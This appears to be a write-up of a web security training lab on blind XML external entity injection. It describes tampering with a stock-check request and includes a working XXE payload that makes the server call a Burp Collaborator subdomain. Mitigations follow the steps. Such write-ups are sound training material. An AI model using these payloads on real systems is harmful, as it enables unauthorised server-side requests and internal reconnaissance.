# Lab Name

Blind XXE with out-of-band interaction

## Vulnerability

Blind XML External Entity (XXE) Injection

## Objective

Exploit a blind XXE vulnerability to make the application server send a request to a Burp Collaborator-controlled domain and confirm the interaction through DNS and HTTP requests.

## Entry Point

Check Stock functionality

## Exploitation Type

Blind XXE / Out-of-Band (OAST) Detection

## Methodology

1. Visit a product page, click **Check stock**, intercept the resulting **POST** request in Burp Suite Professional, and send it to **Burp Repeater**.

2. In the XML request, insert the following external entity definition between the XML declaration and the `stockCheck` element. Right-click and select **Insert Collaborator Payload** to insert your Burp Collaborator subdomain:

```xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://w748l6u3duo9y2xx222betr4evkm8dw2.oastify.com (BURP-COLLABORATOR)"> ]>
```

3. Replace the `productId` value with a reference to the external entity:

```xml
&xxe;
```

4. The modified XML should look similar to:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://w748l6u3duo9y2xx222betr4evkm8dw2.oastify.com (BURP-COLLABORATOR-SUBDOMAIN)"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

5. Send the modified request from **Burp Repeater**.

6. Go to the **Collaborator** tab and click **Poll now**.

7. If no interaction appears immediately, wait a few seconds and poll again because the server-side request may be processed asynchronously.

8. Observe the **DNS and HTTP interactions** generated by the application server.

9. These interactions confirm that the XML parser processed the external entity and caused the application server to make an out-of-band request to the Burp Collaborator domain.

## Payload Used

```xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://w748l6u3duo9y2xx222betr4evkm8dw2.oastify.com(BURP-COLLABORATOR-SUBDOMAIN)"> ]>
```

```xml
&xxe;
```

## Result

Successfully triggered a blind XXE vulnerability and confirmed the server-side external entity request through DNS and HTTP interactions received by Burp Collaborator.

## Impact

* Blind server-side requests
* Potential access to internal services
* Internal network reconnaissance
* Possible SSRF through external entities
* Potential sensitive data disclosure depending on the XML parser configuration

## Mitigation

* Disable external entity processing in XML parsers.
* Disable DTD processing when it is not required.
* Use secure XML parser configurations.
* Restrict unnecessary outbound network connectivity.
* Monitor unexpected DNS and HTTP requests from application servers.

## Learning

Blind XXE occurs when an application processes attacker-controlled XML and allows external entities, but does not return the external entity's response directly to the attacker. In this lab, Burp Collaborator is used as an out-of-band detection mechanism. The DNS and HTTP interactions prove that the vulnerable server processed the external entity and initiated a request to the attacker-controlled domain.
